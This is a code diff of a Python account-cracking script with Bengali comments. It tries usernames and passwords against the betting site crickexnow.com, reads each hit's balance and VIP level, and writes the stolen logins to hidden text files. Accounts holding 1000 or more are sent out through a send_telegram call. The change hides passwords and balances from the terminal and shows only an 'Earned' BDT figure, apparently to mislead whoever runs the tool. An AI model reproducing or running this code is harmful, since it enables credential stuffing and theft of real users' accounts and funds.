@@ -5,6 +5,7 @@ import time
 import shutil
 import requests
 import threading
+import re
 from concurrent.futures import ThreadPoolExecutor
 
 # ANSI Colors
@@ -32,7 +33,7 @@ def show_logo():
 def get_balance_deep(data):
     """bb.py থেকে ব্যালেন্স পাওয়ার লজিক"""
     try:
-        # 1. প্রথমে totalMainProviderBalance চেক করা (bb.py তে এটাই ব্যবহার করা হয়েছে)
+        # 1. প্রথমে totalMainProviderBalance চেক করা
         if 'totalMainProviderBalance' in data and data['totalMainProviderBalance'] is not None:
             return data['totalMainProviderBalance']
         
@@ -59,13 +60,20 @@ def get_balance_deep(data):
                 if key in data['wallet'] and data['wallet'][key] is not None:
                     return data['wallet'][key]
         
-        # 5. vipInfo তে চেক করা
-        if 'vipInfo' in data and isinstance(data['vipInfo'], dict):
-            if 'totalAvailableBalance' in data['vipInfo']:
-                return data['vipInfo']['totalAvailableBalance']
-        
         return 0
     except Exception as e:
+        return 0
+
+def get_balance_value(balance):
+    """ব্যালেন্স থেকে সংখ্যাসংখ্যা extract করা"""
+    try:
+        if isinstance(balance, (int, float)):
+            return float(balance)
+        elif isinstance(balance, str):
+            nums = re.findall(r'\d+\.?\d*', balance)
+            return float(nums[0]) if nums else 0
+        return 0
+    except:
         return 0
 
 def attempt_login(user_id, pw):
@@ -83,7 +91,6 @@ def attempt_login(user_id, pw):
         'Origin': 'https://crickexnow.com',
     }
 
-    # bb.py এর একই fingerprint
     payload = {
         'languageTypeId': 1, 'currencyTypeId': 8, 'getIntercomInfo': True,
         'userId': user_id.lower().strip(), 'password': pw,
@@ -100,59 +107,34 @@ def attempt_login(user_id, pw):
             if res.get('status') == '000000':
                 data = res.get('data', {})
                 
-                # ব্যালেন্স স্ক্যানার কল করা (bb.py এর মতো)
                 balance = get_balance_deep(data)
-                
-                # ভিআইপি লেভেল ফেচিং
                 level = data.get('vipInfo', {}).get('nowVipName', 'Normal')
                 uid = data.get('userId', user_id)
 
                 with lock: successful_users.add(user_id)
                 
-                # ফাইল ও কালার লজিক
                 is_high = level not in ['Normal', 'Bronze']
                 filename = '.high.txt' if is_high else '.normal.txt'
                 color = G if is_high else Y
                 status = 'Good' if is_high else 'Poor'
                 earn = '2 BDT' if is_high else '1 BDT'
 
-                # ব্যালেন্স ভিত্তিক প্রোফাইল (bb.py এর মতো)
-                try:
-                    # Balance কে float এ কনভার্ট করার চেষ্টা
-                    if isinstance(balance, (int, float)):
-                        bal_val = float(balance)
-                    elif isinstance(balance, str):
-                        # String থেকে সংখ্যা extract করা
-                        import re
-                        nums = re.findall(r'\d+\.?\d*', balance)
-                        bal_val = float(nums[0]) if nums else 0
-                    else:
-                        bal_val = 0
-                    
-                    if bal_val >= 1000:
-                        send_telegram(uid, pw, balance, level)
-                        if bal_val >= 10000: 
-                            earn = '100 BDT'
-                            color = C
-                        elif bal_val >= 1500: 
-                            earn = '50 BDT'
-                            color = G
-                            
-                    # Balance টার্মিনালে দেখানো
-                    balance_display = f"Balance: {balance}"
-                    
-                except Exception as e:
-                    bal_val = 0
-                    balance_display = "Balance: 0"
+                bal_val = get_balance_value(balance)
+                
+                if bal_val >= 1000:
+                    send_telegram(uid, pw, balance, level)
+                    if bal_val >= 10000: 
+                        earn = '100 BDT'
+                        color = C
+                    elif bal_val >= 1500: 
+                        earn = '50 BDT'
+                        color = G
 
-                # টার্মিনালে প্রিন্ট (bb.py এর স্টাইলে)
-                print(f'{BOLD}{color} {uid} | {pw} | {balance_display} | Level: {level} | Earn: {earn}{D}')
+                print(f'{BOLD}{color} {uid} | Profile : {status} | Earned : {earn} {D}')
 
-                # ফাইলে সেভ (bb.py এর মতো format)
                 with open(filename, 'a', encoding='utf-8') as f:
-                    f.write(f'{uid} | {pw} | {balance} | {level}\n')
+                    f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level}\n')
                     
-                # আলাদা ব্যালেন্স ফাইল (যদি ব্যালেন্স থাকে)
                 if bal_val > 0:
                     with open('.balances.txt', 'a', encoding='utf-8') as f:
                         f.write(f'{uid} | {pw} | {balance} | {level}\n')
